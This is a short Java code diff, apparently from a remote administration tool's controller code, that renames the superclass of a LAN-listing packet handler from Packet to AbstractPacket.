@@ -4,7 +4,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlLANComputers;
 
-public class PacketLAN extends Packet {
+public class PacketLAN extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
